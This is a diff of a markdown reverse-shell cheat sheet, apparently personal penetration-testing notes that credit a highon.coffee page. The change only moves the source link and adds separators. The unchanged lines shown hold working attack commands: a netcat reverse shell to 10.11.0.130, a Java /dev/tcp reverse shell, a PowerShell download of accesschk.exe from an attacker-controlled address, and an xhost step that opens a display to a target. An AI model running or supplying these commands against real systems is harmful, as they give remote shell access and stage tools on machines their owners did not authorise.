@@ -1,4 +1,3 @@
-https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 # netcat
 ```nc -e /bin/sh 10.11.0.130 443```
@@ -36,6 +35,10 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+* * * 
+
 # Powershell
 #### Powershell 2
 ```(new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe","C:\lec\accesschk.exe")```
@@ -62,6 +65,8 @@ One way to do this is with Xnest (to be run on your system):
 You’ll need to authorise the target to connect to you (command also run on your host):
 
 ```xhost +targetip```
+
+* * * 
 
 # Shell Escape; from Shellcatraz
 ```
